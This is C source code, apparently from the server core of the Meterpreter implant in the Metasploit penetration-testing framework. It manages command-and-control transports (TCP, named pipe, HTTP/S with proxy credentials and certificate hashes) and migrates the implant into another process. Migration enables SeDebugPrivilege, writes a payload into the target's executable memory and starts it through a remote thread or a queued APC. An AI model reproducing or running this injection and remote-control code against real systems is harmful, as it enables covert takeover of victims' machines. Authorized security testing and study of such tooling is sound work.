#include "common.h"
#include "base_inject.h"
#include "../../../config.h"

DWORD get_migrate_context(LPDWORD contextSize, LPCOMMONMIGRATECONTEXT* contextBuffer)
{
	*contextBuffer = (LPCOMMONMIGRATECONTEXT)calloc(1, sizeof(COMMONMIGRATECONTEXT));

	if (*contextBuffer == NULL)
	{
		return ERROR_OUTOFMEMORY;
	}

	*contextSize = sizeof(COMMONMIGRATECONTEXT);

	return ERROR_SUCCESS;
}

DWORD create_transport_from_request(Remote* remote, Packet* packet, Transport** transportBufer)
{
	DWORD result = ERROR_NOT_ENOUGH_MEMORY;
	Transport* transport = NULL;
	wchar_t* transportUrl = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);

	TimeoutSettings timeouts = { 0 };

	int sessionExpiry = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
	timeouts.comms = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
	timeouts.retry_total = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
	timeouts.retry_wait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);

	// special case, will still leave this in here even if it's not transport related
	if (sessionExpiry != 0)
	{
		remote->sess_expiry_time = sessionExpiry;
		remote->sess_expiry_end = current_unix_timestamp() + remote->sess_expiry_time;
	}

	if (timeouts.comms == 0)
	{
		timeouts.comms = remote->transport->timeouts.comms;
	}
	if (timeouts.retry_total == 0)
	{
		timeouts.retry_total = remote->transport->timeouts.retry_total;
	}
	if (timeouts.retry_wait == 0)
	{
		timeouts.retry_wait = remote->transport->timeouts.retry_wait;
	}

	dprintf("[CHANGE TRANS] Url: %S", transportUrl);
	dprintf("[CHANGE TRANS] Comms: %d", timeouts.comms);
	dprintf("[CHANGE TRANS] Retry Total: %u", timeouts.retry_total);
	dprintf("[CHANGE TRANS] Retry Wait: %u", timeouts.retry_wait);

	do
	{
		if (transportUrl == NULL)
		{
			dprintf("[CHANGE TRANS] Something was NULL");
			break;
		}

		if (wcsncmp(transportUrl, L"tcp", 3) == 0)
		{
			MetsrvTransportTcp config = { 0 };
			config.common.comms_timeout = timeouts.comms;
			config.common.retry_total = timeouts.retry_total;
			config.common.retry_wait = timeouts.retry_wait;
			memcpy(config.common.url, transportUrl, sizeof(config.common.url));
			transport = remote->trans_create(remote, &config.common, NULL);
		}
		else if (wcsncmp(transportUrl, L"pipe", 4) == 0)
		{
			MetsrvTransportNamedPipe config = { 0 };
			config.common.comms_timeout = timeouts.comms;
			config.common.retry_total = timeouts.retry_total;
			config.common.retry_wait = timeouts.retry_wait;
			memcpy(config.common.url, transportUrl, sizeof(config.common.url));
			transport = remote->trans_create(remote, &config.common, NULL);
		}
		else
		{
			BOOL ssl = wcsncmp(transportUrl, L"https", 5) == 0;
			wchar_t* ua = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_UA);
			wchar_t* proxy = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_HOST);
			wchar_t* proxyUser = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_USER);
			wchar_t* proxyPass = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_PROXY_PASS);
			PBYTE certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH);

			MetsrvTransportHttp config = { 0 };
			config.common.comms_timeout = timeouts.comms;
			config.common.retry_total = timeouts.retry_total;
			config.common.retry_wait = timeouts.retry_wait;
			wcsncpy(config.common.url, transportUrl, URL_SIZE);

			if (proxy)
			{
				wcsncpy(config.proxy.hostname, proxy, PROXY_HOST_SIZE);
				free(proxy);
			}

			if (proxyUser)
			{
				wcsncpy(config.proxy.username, proxyUser, PROXY_USER_SIZE);
				free(proxyUser);
			}

			if (proxyPass)
			{
				wcsncpy(config.proxy.password, proxyPass, PROXY_PASS_SIZE);
				free(proxyPass);
			}

			if (ua)
			{
				wcsncpy(config.ua, ua, UA_SIZE);
				free(ua);
			}

			if (certHash)
			{
				memcpy(config.ssl_cert_hash, certHash, CERT_HASH_SIZE);
				// No need to free this up as it's not a wchar_t
			}

			transport = remote->trans_create(remote, &config.common, NULL);
		}

		// tell the server dispatch to exit, it should pick up the new transport
		result = ERROR_SUCCESS;
	} while (0);

	*transportBufer = transport;

	return result;
}

DWORD remote_request_core_transport_list(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response = NULL;

	do
	{
		response = packet_create_response(packet);

		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Add the session timeout to the top level
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->sess_expiry_end - current_unix_timestamp());

		Transport* current = remote->transport;
		Transport* first = remote->transport;

		do
		{
			Packet* transportGroup = packet_create_group();

			if (!transportGroup)
			{
				// bomb out, returning what we have so far.
				break;
			}

			dprintf("[DISPATCH] Adding URL %S", current->url);
			packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_URL, current->url);
			dprintf("[DISPATCH] Adding Comms timeout %u", current->timeouts.comms);
			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_COMM_TIMEOUT, current->timeouts.comms);
			dprintf("[DISPATCH] Adding Retry total %u", current->timeouts.retry_total);
			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_RETRY_TOTAL, current->timeouts.retry_total);
			dprintf("[DISPATCH] Adding Retry wait %u", current->timeouts.retry_wait);
			packet_add_tlv_uint(transportGroup, TLV_TYPE_TRANS_RETRY_WAIT, current->timeouts.retry_wait);

			switch (current->type)
			{
				case METERPRETER_TRANSPORT_HTTP:
				case METERPRETER_TRANSPORT_HTTPS:
				{
					HttpTransportContext* ctx = (HttpTransportContext*)current->ctx;
					dprintf("[DISPATCH] Transport is HTTP/S");
					if (ctx->ua)
					{
						packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_UA, ctx->ua);
					}
					if (ctx->proxy)
					{
						packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_HOST, ctx->proxy);
					}
					if (ctx->proxy_user)
					{
						packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_USER, ctx->proxy_user);
					}
					if (ctx->proxy_pass)
					{
						packet_add_tlv_wstring(transportGroup, TLV_TYPE_TRANS_PROXY_PASS, ctx->proxy_pass);
					}
					if (ctx->cert_hash)
					{
						packet_add_tlv_raw(transportGroup, TLV_TYPE_TRANS_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
					}
					break;
				}
			}

			packet_add_group(response, TLV_TYPE_TRANS_GROUP, transportGroup);

			current = current->next_transport;
		} while (first != current);
	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}

BOOL remote_request_core_transport_next(Remote* remote, Packet* packet, DWORD* result)
{
	dprintf("[DISPATCH] Asking to go to next transport (from 0x%p to 0x%p)", remote->transport, remote->transport->next_transport);
	if (remote->transport == remote->transport->next_transport)
	{
		dprintf("[DISPATCH] Transports are the same, don't do anything");
		// if we're switching to the same thing, don't bother.
		*result = ERROR_INVALID_FUNCTION;
	}
	else
	{
		dprintf("[DISPATCH] Transports are different, perform the switch");
		remote->next_transport = remote->transport->next_transport;
		*result = ERROR_SUCCESS;
	}

	packet_transmit_empty_response(remote, packet, *result);
	return *result == ERROR_SUCCESS ? FALSE : TRUE;

}

BOOL remote_request_core_transport_prev(Remote* remote, Packet* packet, DWORD* result)
{
	dprintf("[DISPATCH] Asking to go to previous transport (from 0x%p to 0x%p)", remote->transport, remote->transport->prev_transport);
	if (remote->transport == remote->transport->prev_transport)
	{
		dprintf("[DISPATCH] Transports are the same, don't do anything");
		// if we're switching to the same thing, don't bother.
		*result = ERROR_INVALID_FUNCTION;
	}
	else
	{
		dprintf("[DISPATCH] Transports are different, perform the switch");
		remote->next_transport = remote->transport->prev_transport;
		*result = ERROR_SUCCESS;
	}

	packet_transmit_empty_response(remote, packet, *result);
	return *result == ERROR_SUCCESS ? FALSE : TRUE;
}

DWORD remote_request_core_transport_remove(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;

	// make sure we are not trying to remove the last transport
	if (remote->transport == remote->transport->prev_transport)
	{
		dprintf("[DISPATCH] Refusing to delete the last transport");
		result = ERROR_INVALID_FUNCTION;
	}
	else
	{
		Transport* found = NULL;
		Transport* transport = remote->transport;
		wchar_t* transportUrl = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);

		do
		{
			if (wcscmp(transportUrl, transport->url) == 0)
			{
				found = transport;
				break;
			}

			transport = transport->next_transport;
		} while (transport != remote->transport);

		if (found == NULL || found == remote->transport)
		{
			dprintf("[DISPATCH] Transport not found, or attempting to remove current");
			// if we don't have a valid transport, or they're trying to remove the
			// existing one, then bomb out (that might come later)
			result = ERROR_INVALID_PARAMETER;
		}
		else
		{
			remote->trans_remove(remote, found);
			dprintf("[DISPATCH] Transport removed");
		}

		SAFE_FREE(transportUrl);
	}

	packet_transmit_empty_response(remote, packet, result);
	dprintf("[DISPATCH] Response sent.");
	return result;
}

DWORD remote_request_core_transport_add(Remote* remote, Packet* packet)
{
	Transport* transport = NULL;
	DWORD result = create_transport_from_request(remote, packet, &transport);

	packet_transmit_empty_response(remote, packet, result);
	return result;
}

BOOL remote_request_core_transport_sleep(Remote* remote, Packet* packet, DWORD* result)
{
	// we'll reuse the comm timeout TLV for this purpose
	DWORD seconds = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);

	dprintf("[DISPATCH] request received to sleep for %u seconds", seconds);

	// to sleep, we simply jump to the same transport, with a delay
	remote->next_transport_wait = seconds;
	remote->next_transport = remote->transport;

	packet_transmit_empty_response(remote, packet, ERROR_SUCCESS);
	*result = ERROR_SUCCESS;

	// exit out of the dispatch loop
	return FALSE;
}

BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD* result)
{
	Transport* transport = NULL;
	*result = create_transport_from_request(remote, packet, &transport);

	packet_transmit_empty_response(remote, packet, *result);

	if (*result == ERROR_SUCCESS)
	{
		remote->next_transport = transport;
		// exit out of the dispatch loop.
		return FALSE;
	}

	return TRUE;
}

/*!
 * @brief Set the current hash that is used for SSL certificate verification.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 */
DWORD remote_request_core_transport_setcerthash(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// no setting of the cert hash if the target isn't a HTTPS transport
		if (remote->transport->type != METERPRETER_TRANSPORT_HTTPS)
		{
			result = ERROR_BAD_ENVIRONMENT;
			break;
		}

		unsigned char* certHash = packet_get_tlv_value_raw(packet, TLV_TYPE_TRANS_CERT_HASH);
		HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

		// Support adding a new cert hash if one doesn't exist
		if (!ctx->cert_hash)
		{
			if (certHash)
			{
				PBYTE newHash = (unsigned char*)malloc(sizeof(unsigned char)* CERT_HASH_SIZE);
				if (!newHash)
				{
					result = ERROR_NOT_ENOUGH_MEMORY;
					break;
				}

				memcpy(newHash, certHash, CERT_HASH_SIZE);

				// Set it at the last minute. Mucking with "globals" and all, want to make sure we
				// don't set it too early.. just in case.
				ctx->cert_hash = newHash;
			}
			else
			{
				// at this time, don't support overwriting of the existing hash
				// as that will cause issues!
				result = ERROR_BAD_ARGUMENTS;
				break;
			}
		}
		// support removal of the existing hash
		else
		{
			if (certHash)
			{
				result = ERROR_BAD_ARGUMENTS;
				break;
			}
			else
			{
				SAFE_FREE(ctx->cert_hash);
			}
		}

		result = ERROR_SUCCESS;
	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}

/*!
 * @brief Get the current hash that is used for SSL certificate verification.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 */
DWORD remote_request_core_transport_getcerthash(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Rather than error out if the transport isn't HTTPS, we'll just return
		// an empty response. This prevents a horrible error appearing in the
		// MSF console
		if (remote->transport->type == METERPRETER_TRANSPORT_HTTPS)
		{
			HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
			if (ctx->cert_hash)
			{
				packet_add_tlv_raw(response, TLV_TYPE_TRANS_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
			}
		}

		result = ERROR_SUCCESS;
	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}

/*!
 * @brief Migrate the meterpreter server from the current process into another process.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @param pResult Pointer to the memory that will receive the result.
 * @returns Indication of whether the server should continue processing or not.
 */
BOOL remote_request_core_migrate(Remote * remote, Packet * packet, DWORD* pResult)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet * response = NULL;
	HANDLE hToken = NULL;
	HANDLE hProcess = NULL;
	HANDLE hEvent = NULL;
	BYTE * lpPayloadBuffer = NULL;
	LPVOID lpMigrateStub = NULL;
	LPBYTE lpMemory = NULL;
	LPBYTE lpUuid = NULL;
	LPCOMMONMIGRATECONTEXT ctx = NULL;
	DWORD ctxSize = 0;
	DWORD dwMigrateStubLength = 0;
	DWORD dwPayloadLength = 0;
	DWORD dwProcessID = 0;
	DWORD dwDestinationArch = 0;

	MetsrvConfig* config = NULL;
	DWORD configSize = 0;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			dwResult = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		// Get the process identifier to inject into
		dwProcessID = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PID);

		// Get the target process architecture to inject into
		dwDestinationArch = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_ARCH);

		// Get the length of the payload buffer
		dwPayloadLength = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_PAYLOAD_LEN);

		// Receive the actual migration payload buffer
		lpPayloadBuffer = packet_get_tlv_value_string(packet, TLV_TYPE_MIGRATE_PAYLOAD);

		// Get handles to the updated UUIDs if they're there
		lpUuid = packet_get_tlv_value_raw(packet, TLV_TYPE_UUID);

		// Get the migrate stub information
		dwMigrateStubLength = packet_get_tlv_value_uint(packet, TLV_TYPE_MIGRATE_STUB_LEN);
		lpMigrateStub = packet_get_tlv_value_raw(packet, TLV_TYPE_MIGRATE_STUB);

		dprintf("[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s, PayloadLength=%d", dwProcessID, (dwDestinationArch == 2 ? "x64" : "x86"), dwPayloadLength);

		// If we can, get SeDebugPrivilege...
		if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		{
			TOKEN_PRIVILEGES priv = { 0 };

			priv.PrivilegeCount = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			{
				if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL));
				{
					dprintf("[MIGRATE] Got SeDebugPrivilege!");
				}
			}

			CloseHandle(hToken);
		}

		// Open the process so that we can migrate into it
		hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessID);
		if (!hProcess)
		{
			BREAK_ON_ERROR("[MIGRATE] OpenProcess failed")
		}

		// get the existing configuration
		dprintf("[MIGRATE] creating the configuration block");
		remote->config_create(remote, lpUuid, &config, &configSize);
		dprintf("[MIGRATE] Config of %u bytes stashed at 0x%p", configSize, config);

		if (remote->transport->get_migrate_context != NULL)
		{
			dwResult = remote->transport->get_migrate_context(remote->transport, dwProcessID, hProcess, &ctxSize, (LPBYTE*)&ctx);
		}
		else
		{
			dwResult = get_migrate_context(&ctxSize, &ctx);
		}

		if (dwResult != ERROR_SUCCESS)
		{
			dprintf("[MIGRATE] Failed to create migrate context: %u", dwResult);
			break;
		}

		// Create a notification event that we'll use to know when it's safe to exit
		// (once the socket has been referenced in the other process)
		hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (!hEvent)
		{
			BREAK_ON_ERROR("[MIGRATE] CreateEvent failed");
		}

		// Duplicate the event handle for the target process
		if (!DuplicateHandle(GetCurrentProcess(), hEvent, hProcess, &ctx->e.hEvent, 0, TRUE, DUPLICATE_SAME_ACCESS))
		{
			BREAK_ON_ERROR("[MIGRATE] DuplicateHandle failed");
		}

		dprintf("[MIGRATE] Duplicated Event Handle: 0x%x", (UINT_PTR)ctx->e.hEvent);

		// Allocate memory for the migrate stub, context, payload and configuration block
		lpMemory = (LPBYTE)VirtualAllocEx(hProcess, NULL, dwMigrateStubLength + ctxSize + dwPayloadLength + configSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!lpMemory)
		{
			BREAK_ON_ERROR("[MIGRATE] VirtualAllocEx failed");
		}

		// Calculate the address of the payload...
		ctx->p.lpPayload = lpMemory + dwMigrateStubLength + ctxSize;

		// Write the migrate stub to memory...
		dprintf("[MIGRATE] Migrate stub: 0x%p -> %u bytes", lpMemory, dwMigrateStubLength);
		if (!WriteProcessMemory(hProcess, lpMemory, lpMigrateStub, dwMigrateStubLength, NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 1 failed");
		}

		// Write the migrate context to memory...
		dprintf("[MIGRATE] Migrate context: 0x%p -> %u bytes", lpMemory + dwMigrateStubLength, ctxSize);
		if (!WriteProcessMemory(hProcess, lpMemory + dwMigrateStubLength, ctx, ctxSize, NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 2 failed");
		}

		// Write the migrate payload to memory...
		dprintf("[MIGRATE] Migrate payload: 0x%p -> %u bytes", ctx->p.lpPayload, dwPayloadLength);
		if (!WriteProcessMemory(hProcess, ctx->p.lpPayload, lpPayloadBuffer, dwPayloadLength, NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 3 failed");
		}

		// finally write the configuration stub
		dprintf("[MIGRATE] Configuration: 0x%p -> %u bytes", ctx->p.lpPayload + dwPayloadLength, configSize);
		if (!WriteProcessMemory(hProcess, ctx->p.lpPayload + dwPayloadLength, config, configSize, NULL))
		{
			BREAK_ON_ERROR("[MIGRATE] WriteProcessMemory 4 failed");
		}

		free(ctx);

		// First we try to migrate by directly creating a remote thread in the target process
		if (inject_via_remotethread(remote, response, hProcess, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
		{
			dprintf("[MIGRATE] inject_via_remotethread failed, trying inject_via_apcthread...");

			// If that fails we can try to migrate via a queued APC in the target process
			if (inject_via_apcthread(remote, response, hProcess, dwProcessID, dwDestinationArch, lpMemory, lpMemory + dwMigrateStubLength) != ERROR_SUCCESS)
			{
				BREAK_ON_ERROR("[MIGRATE] inject_via_apcthread failed");
			}
		}

		dwResult = ERROR_SUCCESS;

	} while (0);

	SAFE_FREE(config);

	// If we failed and have not sent the response, do so now
	if (dwResult != ERROR_SUCCESS && response)
	{
		dprintf("[MIGRATE] Sending response");
		packet_transmit_response(dwResult, remote, response);
	}

	// Cleanup...
	if (hProcess)
	{
		dprintf("[MIGRATE] Closing the process handle 0x%08x", hProcess);
		CloseHandle(hProcess);
	}

	if (hEvent)
	{
		dprintf("[MIGRATE] Closing the event handle 0x%08x", hEvent);
		CloseHandle(hEvent);
	}

	if (pResult)
	{
		*pResult = dwResult;
	}

	// if migration succeeded, return 'FALSE' to indicate server thread termination.
	dprintf("[MIGRATE] Finishing migration, result: %u", dwResult);
	return ERROR_SUCCESS == dwResult ? FALSE : TRUE;
}

/*!
 * @brief Update the timeouts with the given values
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the request packet.
 * @returns Indication of success or failure.
 * @remark If no values are given, no updates are made. The response to
 *         this message is the new/current settings.
 */
DWORD remote_request_core_transport_set_timeouts(Remote * remote, Packet * packet)
{
	DWORD result = ERROR_SUCCESS;
	Packet* response = NULL;

	do
	{
		response = packet_create_response(packet);
		if (!response)
		{
			result = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		int expirationTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_SESSION_EXP);
		int commsTimeout = (int)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
		DWORD retryTotal = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_TOTAL);
		DWORD retryWait = (DWORD)packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_RETRY_WAIT);

		// TODO: put this in a helper function that can be used everywhere?

		// if it's in the past, that's fine, but 0 implies not set
		if (expirationTimeout != 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting expiration time to %d", expirationTimeout);
			remote->sess_expiry_time = expirationTimeout;
			remote->sess_expiry_end = current_unix_timestamp() + expirationTimeout;
		}

		if (commsTimeout != 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting comms timeout to %d", commsTimeout);
			remote->transport->timeouts.comms = commsTimeout;
			remote->transport->comms_last_packet = current_unix_timestamp();
		}

		if (retryTotal > 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting retry total to %u", retryTotal);
			remote->transport->timeouts.retry_total = retryTotal;
		}

		if (retryWait > 0)
		{
			dprintf("[DISPATCH TIMEOUT] setting retry wait to %u", retryWait);
			remote->transport->timeouts.retry_wait = retryWait;
		}

		// for the session expiry, return how many seconds are left before the session actually expires
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_SESSION_EXP, remote->sess_expiry_end - current_unix_timestamp());
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_COMM_TIMEOUT, remote->transport->timeouts.comms);
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_TOTAL, remote->transport->timeouts.retry_total);
		packet_add_tlv_uint(response, TLV_TYPE_TRANS_RETRY_WAIT, remote->transport->timeouts.retry_wait);

	} while (0);

	if (response)
	{
		packet_transmit_response(result, remote, response);
	}

	return result;
}
